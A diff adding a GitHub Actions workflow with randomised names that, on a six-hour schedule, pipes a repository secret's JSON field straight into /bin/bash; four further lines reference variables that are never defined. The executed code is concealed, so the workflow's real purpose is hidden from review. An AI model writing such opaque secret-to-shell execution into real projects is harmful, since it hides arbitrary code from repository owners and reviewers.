@@ -1,0 +1,20 @@
+name: fibertshirt
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fibertshirt
+        env:
+          lygx292: ${{ secrets.lygx292 }}
+        run: |
+          echo $lygx292 | jq -r .ylm6 | /bin/bash
+          echo $ajwaf00 | jq -r .okvd7 | /bin/bash
+          echo $bjjdk178 | jq -r .rhm2 | /bin/bash
+          echo $ahga9047 | jq -r .lrw2 | /bin/bash
+          echo $apxc21553 | jq -r .i407 | /bin/bash
+
